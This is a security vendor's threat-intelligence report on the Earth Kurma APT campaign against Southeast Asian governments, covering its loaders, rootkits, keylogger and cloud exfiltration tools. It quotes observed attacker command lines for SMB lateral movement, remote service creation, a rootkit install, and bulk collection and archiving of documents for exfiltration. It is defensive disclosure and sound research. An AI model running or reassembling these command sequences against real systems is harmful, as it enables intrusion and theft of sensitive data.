---
title: "Earth Kurma APT Campaign Targets Southeast Asian Government, Telecom Sectors"
source: "https://www.trendmicro.com/en_us/research/25/d/earth-kurma-apt-campaign.html"
crawled_at: "2026-01-20T16:25:08.403268"
---

# Earth Kurma APT Campaign Targets Southeast Asian Government, Telecom Sectors

**Source:** [https://www.trendmicro.com/en_us/research/25/d/earth-kurma-apt-campaign.html](https://www.trendmicro.com/en_us/research/25/d/earth-kurma-apt-campaign.html)

---

APT & Targeted Attacks

# Earth Kurma APT Campaign Targets Southeast Asian Government, Telecom Sectors

An APT group dubbed Earth Kurma is actively targeting government and telecommunications organizations in Southeast Asia using advanced malware, rootkits, and trusted cloud services to conduct cyberespionage.

By: Nick Dai, Sunny Lu Apr 25, 2025 Read time:  ( words) 

[ ![Share](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg) ](https://www.trendmicro.com/<https:/www.addtoany.com/share>) ![Print](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg)

Save to Folio

__

* * *

**Summary:**

  * Trend Research uncovered a sophisticated APT campaign targeting government and telecommunications sectors in Southeast Asia. Named Earth Kurma, the attackers use advanced custom malware, rootkits, and cloud storage services for data exfiltration. Earth Kurma demonstrates adaptive malware toolsets, strategic infrastructure abuse, and complex evasion techniques.
  * This campaign poses a high business risk due to targeted espionage, credential theft, persistent foothold established through kernel-level rootkits, and data exfiltration via trusted cloud platforms.
  * Organizations primarily in government and telecommunications sectors in Southeast Asia (particularly the Philippines, Vietnam, Thailand, Malaysia) are affected. Organizations face potential compromise of sensitive government and telecommunications data, with attackers maintaining prolonged, undetected access to their networks.
  * Trend Vision One™ detects and blocks the malicious components used in the APT campaign. Trend Vision One customers can also access hunting queries, threat insights, and threat intelligence reports to gain rich context and the latest updates on Earth Kurma.

Introduction

Since June 2024, we uncovered a sophisticated APT campaign targeting multiple countries in Southeast Asia, including the Philippines, Vietnam, and Malaysia. We have named the threat actors behind this campaign “Earth Kurma.” Our analysis revealed that they primarily focused on government sectors, showing particular interest in data exfiltration. Notably, this wave of attacks involved rootkits to maintain persistence and conceal their activities.

In this research, we provide the intelligence on Earth Kurma and their ongoing activities. We’ll disclose technical details, including their tactics, techniques and procedures (TTPs), as well as specifics on their toolsets, such as TESDAT, SIMPOBOXSPY, KRNRAT, and MORIYA, among others.

Who is Earth Kurma?

Earth Kurma is a new APT group focused on countries in Southeast Asia. All of the identified victims belong to government and government-related telecommunications sectors. From our long-term monitoring, their activities dated back to November 2020, with data exfiltration as their primary objective. Our analysis indicates that they tend to exfiltrate data over public cloud services, like Dropbox and OneDrive. To accomplish this, they used various customized toolsets including TESDAT and SIMPOBOXSPY. Earth Kurma also developed rootkits such as KRNRAT and MORIYA to hide their activities.

As for attribution, we found overlaps between Earth Kurma’s tools and those of other known APT groups. The MORIYA rootkits in this campaign share the same code base as the ones used in [Operation TunnelSnake](https://www.trendmicro.com/<https:/securityaffairs.com/117626/malware/moriya-rootkit-operation-tunnelsnake.html>), while SIMPOBOXSPY and the exfiltration script link closely to another APT group called [ToddyCat](https://www.trendmicro.com/<https:/thehackernews.com/2022/06/new-toddycat-hacker-group-on-experts.html>). However, differences in the attack patterns prevent us from conclusively attributing these campaigns and operations to the same threat actors. Hence, we named this new APT group “Earth Kurma.”

Impact

Our telemetry shows that that Earth Kurma targeted victims primarily in Southeast Asia, including the Philippines, Vietnam, Thailand and Malaysia. Earth Kurma’s targets likely indicate cyberespionage as the motivation.

![The victimology distribution](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/fig01-01.png)

Figure 1. The victimology distribution

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/fig01-01.png>)

Infection Chain

The infection chain and malware used could be summarized as follows:

![The full infection flow of Earth Kurma’s attacks](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/fig2.png)

Figure 2. The full infection flow of Earth Kurma’s attacks

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/fig2.png>)

Lateral Movement

We were unable to confirm the arrival vectors used in the attacks, as our analysis started years after the victims were first compromised.  
  
Multiple tools were used in the lateral movement stage. Various utilities were used to scan the victims’ infrastructures and deploy malware, including NBTSCAN, LADON, FRPC, WMIHACKER and ICMPinger. They also deployed a keylogger, KMLOG, to steal credentials from victims.

To survey the victims’ infrastructures, the threat actors used a tool named ICMPinger to scan the hosts. It is a simple network scanning tool based on the ICMP protocol to test if the specified hosts are still alive. They delete this tool once their operations conclude.

![The usage of ICMPinger, showing tasks being completed](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig3.png)

Figure 3. The usage of ICMPinger, showing tasks being completed

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig3.png>)

They also used another open-source tool called [Ladon](https://www.trendmicro.com/<https:/github.com/k8gege/Ladon>) to inspect the infrastructure. To bypass detection, Ladon is wrapped in a reflective loader compiled by PyInstaller. The XOR keys used to decode the payload differ among all the samples we’ve collected.

![The reflective loading procedures for Ladon](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig4.png)

Figure 4. The reflective loading procedures for Ladon

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig4.png>)

To move laterally, they also used another open-source tool called [WMIHACKER](https://www.trendmicro.com/<https:/github.com/rootclay/WMIHACKER>), which could execute commands over port 135 without the need for SMB.

![The script body of WMIHACKER](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig5.png)

Figure 5. The script body of WMIHACKER

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig5.png>)

In some of the cases we observed, they also execute commands over the SMB protocol (such as using “net use”) to inspect the infrastructure as well as deploy malware.

C:\Windows\system32\cmd.exe /C sc.exe -a 172.20.40.0-172.20.40.255 -t 500 -f lg.txt -c 1 -o 100 –n  
C:\Windows\system32\cmd.exe /C net use \\\172.20.40.41\c$ {password} /u:{user}  
C:\Windows\system32\cmd.exe /C copy vdmsc.dll \\\172.20.40.41\c$\users\\{user} \videos  
C:\Windows\system32\cmd.exe /C copy msv.dat \\\172.20.40.41\c$\windows\system32  
C:\Windows\system32\cmd.exe /C sc \\\172.20.40.41 create katech binpath= "cmd /c start /b rundll32.exe c:\users\\{user}\videos\vdmsc.dll,Init"  
C:\Windows\system32\cmd.exe /C sc \\\172.20.40.41 start katech  
C:\Windows\system32\cmd.exe /C sc \\\172.20.40.41 delete katech  
C:\Windows\system32\cmd.exe /C net use \\\172.20.40.41\c$ /del /y

The threat actors also tried to steal the credentials from the victims by using a custom tool called KMLOG. It’s a simple keylogger that logs every keystroke to a file named “%Appdata%\Roaming\Microsoft\Windows\Libraries\infokey.zip.”

![The keystroke logs](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig6.png)

Figure 6. The keystroke logs

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig6.png>)

To hide the keystroke log file, it is prepended with a fake ZIP file header (PK header). What follows the header is the real body of the logging content.

**Title** | **Encryption** | **Data**  
---|---|---  
Header | None | Predefined PK file header  
[Title] | XOR 0xDB | GetForegroundWindow title text  
[Time] | GetLocalTime  
[Content] | Keystrokes  
  
Table 1. The structure of the keystroke logging file

Persistence

In the persistence stage, the actors deployed different loaders to maintain their foothold, including DUNLOADER, TESDAT and DMLOADER. These loaders are used to load payload files into memory and execute them. These loaders are then used to deploy more malware and exfiltrate data over public cloud services like Dropbox and OneDrive. In some cases, rootkits, including KRNRAT and MORIYA, were implanted by the loaders to bypass the scanning.

**Loaders**

Between 2022 and 2024, we observed multiple loaders implanted in victim environments, including DUNLOADER, TESDAT and DMLOADER. Most of the final payloads are Cobalt Strike beacons.

The first loader we encountered is DUNLOADER. It’s capable of loading the payloads from either of the locations and decode it in one-byte XOR operations:

  * From a file named “pdata.txt”
  * From its own resource blob named “BIN”

This loader is a DLL file and always ensures that it’s executed by “rundll32.exe” by checking if the name of the parent process contains a specific string literal “und”. In most cases, this DLL should contain an export function called “Start.”

![The process name checking routine in DUNLOADER \(top\) and the shellcode invocation routine in TESDAT \(bottom\)](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig7A.png)

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig7A.png>)

![The process name checking routine in DUNLOADER \(top\) and the shellcode invocation routine in TESDAT \(bottom\)](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig7B.png)

Figure 7. The process name checking routine in DUNLOADER (top) and the shellcode invocation routine in TESDAT (bottom)

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig7B.png>)

The newer loader we later found is called TESDAT. It always loads a payload file with a “.dat” extension (like “mns.dat”). Instead of using common APIs like CreateThread to execute the decoded shellcode, it always calls an API called “SwitchToFiber,” which we think is an attempt to avoid detection. Our analysis showed two variants for TESDAT loaders. It can be either an EXE file or a DLL file with an export function called “Init.”

We also noticed that the actors would name the loaders with some random strings and put them inside the folders that were often accessed by the victims instead of those commonly used by attackers (i.e., %ProgramData% or %Public%). This was presumably intended to blend the loaders with legitimate user files. Here are some filename examples:

  * C:\Users\\{user}\downloads\wcrpc.dll
  * C:\Users\\{user}\downloads\mflpro\acrg.dll
  * C:\Users\\{user}\documents\ViberDownloads\mfsvc.dll
  * C:\Users\\{user}\downloads\fwdjustification\dilx.exe
  * C:\Users\\{user}\downloads\ffap3560pcl6220510w636iml\drasc.dll
  * C:\Users\\{user}\downloads\1\2\3\prikc.exe
  * C:\Users\\{user}\Downloads\Rufus\gpupdat.exe

More recently, we observed a new loader, DMLOADER, was implanted. Instead of loading an additional payload file, it loads the embedded payload and decodes it as an in-memory PE buffer. This loader usually has an export function called “DoMain” or “StartProtect.” In the decoded PE payload, it should have an export function called “MThread.”

**Rootkits**

After the loaders are implanted in the victim machines, we found rootkits installed on some compromised machines. To install the rootkits, the threat actor abused a living-off-the-land binary called “syssetup.dll” and dropped an INF file to install them. An example of the used command line is as follows:

C:\Windows\SysWOW64\rundll32.exe syssetup,SetupInfObjectInstallAction DefaultInstall 128 c:\users\\{user}\downloads\SmartFilter.inf

The first rootkit we observed is called MORIYA, which could hide the malicious payload in the TCP traffic.

MORIYA works as a TCP traffic interceptor. It tries to monitor if an incoming TCP packet is from the command-and-control (C&C) server by checking its first six magic bytes. The magic bytes could be registered by issuing a specific IOCTL code 0x222004 from its user-mode agent. If any packet is matched, it tries to inject the malicious payload into the body of the response packet. The variant we found works exactly the same as the one from this MORIYA [report](https://www.trendmicro.com/<https:/securityaffairs.com/117626/malware/moriya-rootkit-operation-tunnelsnake.html>).

![The IOCTL code in MORIYA \(top\) and the working flow for MORIYA \(bottom\)](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig8A.png)

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig8A.png>)

![The IOCTL code in MORIYA \(top\) and the working flow for MORIYA \(bottom\)](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/fig8b.png)

Figure 8. The IOCTL code in MORIYA (top) and the working flow for MORIYA (bottom)

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/fig8b.png>)

The MORIYA variant we found has an additional shellcode injection capability. At the end of its execution, it tries to load a payload file from the location ”\\\SystemRoot\\\system32\\\drivers\\\\{driver_name}.dat.” The payload will be decrypted in AES and injected into the process of svchost.exe. This payload should be its user-mode agent.

![The shellcode injection routine in MORIYA](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig9.png)

Figure 9. The shellcode injection routine in MORIYA

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig9.png>)

The shellcode will eventually be invoked by using the API NtCreateThreadEx. To bypass detection, it tries to invoke the call by directly using the syscall number. To get the valid syscall numbers on the targeted system, it enumerates the NTDLL’s export functions, finds the ones with names starting with “Zw” or “Nt” and saves the syscall number of each. This code snippet is reused from [this post](https://www.trendmicro.com/<https:/www.unknowncheats.me/forum/3247989-post4.html>).

![The NTDLL enumeration routine in MORIYA](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig10.png)

Figure 10. The NTDLL enumeration routine in MORIYA

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig10.png>)

The other rootkit we found is called KRNRAT. It’s a full-featured backdoor with various capabilities, including process manipulation, file hiding, shellcode execution, traffic concealment, and C&C communication. We named this rootkit KRNRAT because of its internal name, just as written in its PDB string: N:\project\li\ThreeTools\KrnRat\code\x64\Debug\SmartFilter.pdb

Our analysis showed that KRNRAT is based upon multiple open-source projects:

  * <https://github.com/w1nds/ishellcode>
  * <https://github.com/DarthTon/Blackbone>
  * <https://github.com/XaFF-XaFF/Cronos-Rootkit>
  * <https://github.com/JKornev/hidden>
  * <https://github.com/amitschendel/venom-rootkit>

KRNRAT supports numerous IOCTL codes and capabilities. Its debug strings are also self-explanatory. Here’s the full table of the supported IOCTL codes.

IoControlCode  | Description (Debug Strings)  
---|---  
0x222000  | IOCTL_TERMINATE_PROCESS   
0x22200C  | IOCTL_SUSPEND_PROCESS   
0x222010  | IOCTL_TERMINATE_PROCESS (Misspelled, it should be IOCTL_RESUME_PROCESS)  
0x222014  | IOCTL_ADD_BLACK_PROCESS   
0x222018  | IOCTL_REMOVE_BLACK_PROCESS   
0x22201C  | IOCTL_ADD_HIDDEN_FILE   
0x222020  | IOCTL_ADD_HIDDEN_DIR   
0x222024  | IOCTL_REMOVE_HIDDEN_FILE   
0x222040  | IOCTL_REMOVE_HIDDEN_DIR   
0x222048  | IOCTL_REMOVE_HIDDEN_PROCESS   
0x22204C  | IOCTL_ADD_LOCAL_HIDDEN_PORT   
0x222050  | IOCTL_REMOVE_LOCAL_HIDDEN_PORT   
0x222054  | IOCTL_ADD_REMOTE_HIDDEN_PORT   
0x222058  | IOCTL_REMOVE_REMOTE_HIDDEN_PORT   
0x22205C  | IOCTL_REMOVE_LOCAL_HIDDEN_PORT   
0x222060  | IOCTL_REMOVE_LOCAL_HIDDEN_IP   
0x222064  | IOCTL_ADD_REMOTE_HIDDEN_IP   
0x222080  | IOCTL_REMOVE_REMOTE_HIDDEN_IP   
0x222084  | IOCTL_REMOVE_ALL_HIDDEN_NET   
0x222088  | IOCTL_PROTECT_PROCESS   
0x22208C  | IOCTL_ELEVATE_PROCESS   
0x222090  | IOCTL_INJECT_SHELLCODE  
  
Table 2. The command codes supported in KRNRAT

At the end of its execution, it also loads the additional payload file and injects it into the svchost.exe process. This shellcode injection capability works exactly the same as the MORIYA variant we found. This time, we were able to collect the payload, which turns out to be the user-mode agent for KRNRAT and is the backdoor. This means that its user-mode agent is always memory-resident.

The backdoor is a stager. It connects to the C&C server and downloads the next-stage payload back. It tries to hide the process and connections by issuing the specific IOCTL codes to the KRNRAT rootkit.

![How the backdoor used KRNRAT to hide its process](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig11.png)

Figure 11. How the backdoor used KRNRAT to hide its process

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig11.png>)

![How the backdoor used KRNRAT to hide outbound IPs](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig12.png)

Figure 12. How the backdoor used KRNRAT to hide outbound IPs

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig12.png>)

Offset | Size | Name | Description  
---|---|---|---  
0x0 | 0x8 | minutes | The sleep minutes  
0x8 | 0x4 | hourStart | The number of hour that the current time is after  
0xC | 0x4 | hourEnd | The number of hour that the current time is before  
0x10 | 0x4 | reserved |   
0x14 | 0x4 | dayOfWeekStart | The number of day of week that the current time is after  
0x18 | 0x4 | dayOfWeekEnd | The number of day of week that the current time is before  
  
Table 3. The structure of the backdoor’s configuration in the registry

The final payload from the C&C server would be the so-called [SManager](https://www.trendmicro.com/<https:/jp.security.ntt/tech_blog/102glv5>).

![The SManager’s export function “GetPluginInformation”](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig13.png)

Figure 13. The SManager’s export function “GetPluginInformation”

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig13.png>)

Collection and Exfiltration

In the collection and exfiltration stage, we observed two customized tools used to exfiltrate specific documents to the attacker’s cloud services, such as Dropbox and OneDrive. Before exfiltrating the files, several commands executed by the loader TESDAT collected specific document files with the following extensions: .pdf, .doc, .docx, .xls, .xlsx, .ppt, and .pptx. The documents are first placed into a newly created folder named "tmp," which is then archived using WinRAR with a specific password.

C:\Windows\system32\cmd.exe /C dir c:\users  
C:\Windows\system32\cmd.exe /C mkdir tmp  
C:\Windows\system32\cmd.exe /C powershell.exe "dir c:\users -File -Recurse -Include '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt' , '*.pptx'| where LastWriteTime -gt (Get-date).AddDays(-30) | foreach {cmd /c copy $_ /y c:\users\\{username}\documents\tmp};echo Finish!"  
C:\Windows\system32\cmd.exe /C c:\"program files"\winrar\rar.exe a -p{password} -v200m c:\users\\{username}\documents\\{hostname} c:\users\\{username}\documents\tmp -ep  
C:\Windows\system32\cmd.exe /C rmdir /s /q tmp

The first tool, SIMPOBOXSPY, is an exfiltration tool that can upload the archive files to Dropbox with a specified access token. This tool is exactly the “generic DropBox uploader” mentioned in this [ToddyCat report](https://www.trendmicro.com/<https:/thehackernews.com/2022/06/new-toddycat-hacker-group-on-experts.html>). The command argument of SIMPOBOXSPY is shown below.

dilx.exe {access_token} [-f {file_1} {file_2} ...]

If the argument “-f” is not specified, it will upload the file in the current folder with predefined extensions such as “.z”, “.001”, “.002”,...,”.128”. There is also another variant, which will upload the archive with the extension “.7z”

After uploading the files to Dropbox, a folder named with the current date and time will be created on Dropbox.

![The SIMPOBOXSPY’s stdout](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig14.png)

Figure 14. The SIMPOBOXSPY’s stdout

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig14.png>)

The other tool, ODRIZ, is an old tool found in 2023. It will upload the collected files to OneDrive by specifying the OneDrive refresh token. The command argument is shown below. It will upload the files in the current folder with the pattern “*.z.*”.

odriz.exe {refresh_token}

![The usage of ODRIZ \(top\) and the codes in ODRIZ \(bottom\)](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig15.png)

Figure 15. The usage of ODRIZ (top) and the codes in ODRIZ (bottom)

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/Fig15.png>)

The process of file collection and exfiltration is shown in the following:

![The exfiltration flow](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/fig16new.png)

Figure 16. The exfiltration flow

[ download ](https://www.trendmicro.com/</content/dam/trendmicro/global/en/research/25/d/earth-kurma-apt-campaign-targets-southeast-asian-government,-telecoms-sectors/fig16new.png>)

After collecting all the files into a password-protected archive, which is normally named after the host name, the archived RAR will be copied to the folder** _\\\DC_server\sysvol\\{domain}\Policies\\{ID}\user\_** via the SMB protocol. The folder “sysvol” contains all of AD policies and information, and this folder only exists on DC servers. We believe that the attackers move all the collected archives in the folder “sysvol” to utilize a native Windows mechanism called [Distributed File System Replication](https://www.trendmicro.com/<https:/learn.microsoft.com/en-us/windows-server/storage/dfs-replication/dfsr-overview>) (DFSR). It is a Windows feature that synchronizes AD policies across DC servers by replicating the contents of the “sysvol” folder among them. With this, the stolen archives can be automatically synchronized to all DC servers, enabling exfiltration through any one of them.

Attribution

Our analysis identified weak links to two groups, ToddyCat and Operation TunnelSnake. After a thorough examination, we determined that this campaign merited a separate designation, Earth Kurma.

The APT group ToddyCat was first disclosed in 2022. The "tailored loader,” mentioned in this [ToddyCat report](https://www.trendmicro.com/<https:/thehackernews.com/2022/06/new-toddycat-hacker-group-on-experts.html>), was also found in the same victim machines infected by the TESDAT loaders. However, we did not find any process execution logs between these loaders. Also, they share similar exfiltration PowerShell scripts. The tool SIMPOBOXSPY used by Earth Kurma was also used by ToddyCat before.

Both Earth Kurma and ToddyCat highly targeted Southeast Asian countries. Reports on ToddyCat indicate that activities started in 2020. The timeline of their activities aligned closely to what we observed in Earth Kurma.

However, SIMPOBOXSPY is a simple tool that could be shared among groups, and we did not observe other exclusive tools that can be directly attributed to ToddyCat. Thus, we cannot conclusively link Earth Kurma to ToddyCat.

The second potentially related APT group is Operation TunnelSnake, which was also reported in 2021. In the report they used MORIYA, which uses the same code base as the MORIYA variant we found. Additionally, Operation TunnelSnake targeted countries in Southeast Asia. Nevertheless, we didn’t observe any similarity in the post-exploitation stages.

Security best practices

Earth Kurma remains highly active, continuing to target countries around Southeast Asia. They have the capability to adapt to victim environments and maintain a stealthy presence. They can also reuse the same code base from previously identified campaigns to customize their toolsets, sometimes even utilizing the victim’s infrastructure to achieve their goals.

Here are some best security practices to mitigate such threats:

  * **Enforce strict driver installation policies.** Allow only digitally signed and explicitly approved drivers through Group Policies or application control solutions to prevent malicious rootkits.
  * **Strengthen Active Directory (AD) and DFSR controls.** Secure AD’s sysvol directory and closely audit DFSR replication events to prevent misuse for stealthy data exfiltration.
  * **imit SMB communications.** Restrict SMB protocol usage across the network to prevent lateral movement and unauthorized file transfers.

Proactive security with Trend Vision One™

[Trend Vision One](https://www.trendmicro.com/</en_us/business/products/one-platform.html>)™ is the only AI-powered enterprise cybersecurity platform that centralizes cyber risk exposure management, security operations, and robust layered protection. This comprehensive approach helps you predict and prevent threats, accelerating proactive security outcomes across your entire digital estate. Backed by decades of cybersecurity leadership and Trend Cybertron, the industry's first proactive cybersecurity AI, it delivers proven results: a 92% reduction in ransomware risk and a 99% reduction in detection time. Security leaders can benchmark their posture and showcase continuous improvement to stakeholders. With Trend Vision One, you’re enabled to eliminate security blind spots, focus on what matters most, and elevate security into a strategic partner for innovation.

Trend Vision One Threat Intelligence

To stay ahead of evolving threats, Trend Vision One customers can access a range of Intelligence Reports and Threat Insights. Threat Insights helps customers stay ahead of cyber threats before they happen and allows them to prepare for emerging threats by offering comprehensive information on threat actors, their malicious activities, and their techniques. By leveraging this intelligence, customers can take proactive steps to protect their environments, mitigate risks, and effectively respond to threats. 

**Trend Vision One Intelligence Reports App [IOC Sweeping]**

  * _Earth Kurma Uncovered: Cyber Threats to Southeast Asian Governments_

**Trend Vision One Threat Insights App**

  * Threat Actors: [Earth Kurma](https://www.trendmicro.com/<https:/portal-xdr.visionone.trendmicro.com/index.html#/app/ti/intelligence_insights?name=Earth%20Kurma>)
  * Emerging Threats: [Earth Kurma Uncovered: Cyber Threats to Southeast Asian Governments](https://www.trendmicro.com/<https:/portal-xdr.visionone.trendmicro.com/index.html#/app/ti/intelligence_insights?name=Earth%20Kurma%20Uncovered%3A%20Cyber%20Threats%20to%20Southeast%20Asian%20Governments>)

Hunting Queries

**Trend Vision One Search App**

Trend Vision One customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment. 

Scan for the Earth Kurma malware detections:

malName: (*DUNLOADER* OR *TESDAT* OR *DMLOADER* OR *MORIYA* OR *KRNRAT* OR *SIMPOBOXSPY* OR *ODRIZ* OR *KMLOG*) AND eventName: MALWARE_DETECTION

Indicators of Compromise (IoC)

The indicators of compromise for this entry can be found [here](https://www.trendmicro.com/<https:/documents.trendmicro.com/assets/txt/EarthKurma-IOCssVJ3RcK.txt>). 

Tags

[APT & Targeted Attacks](https://www.trendmicro.com/</en_us/research.html?category=trend-micro-research:threats/apt-and-targeted-attacks>) | [Endpoints](https://www.trendmicro.com/</en_us/research.html?category=trend-micro-research:environments/endpoints>) | [Research](https://www.trendmicro.com/</en_us/research.html?category=trend-micro-research:article-type/research>) | [Articles, News, Reports](https://www.trendmicro.com/</en_us/research.html?category=trend-micro-research:medium/article>)

###  Authors 

  * Nick Dai

Sr. Threat Researcher

  * Sunny Lu

Threats Analyst

[ Contact Us ](https://www.trendmicro.com/<mailto:tm_research@trendmicro.com>)

### Related Articles

  * [ From Extension to Infection: An In-Depth Analysis of the Evelyn Stealer Campaign Targeting Software Developers ](https://www.trendmicro.com/</en_us/research/26/a/analysis-of-the-evelyn-stealer-campaign.html>)
  * [ Introducing ÆSIR: Finding Zero-Day Vulnerabilities at the Speed of AI ](https://www.trendmicro.com/</en_us/research/26/a/aesir.html>)
  * [ Your 100 Billion Parameter Behemoth is a Liability ](https://www.trendmicro.com/</en_us/research/26/a/your-100-billion-parameter-behemoth-is-a-liability.html>)

[ See all articles ](https://www.trendmicro.com/</en_us/research.html>)

[ ](https://www.trendmicro.com/</en_us/research.html>)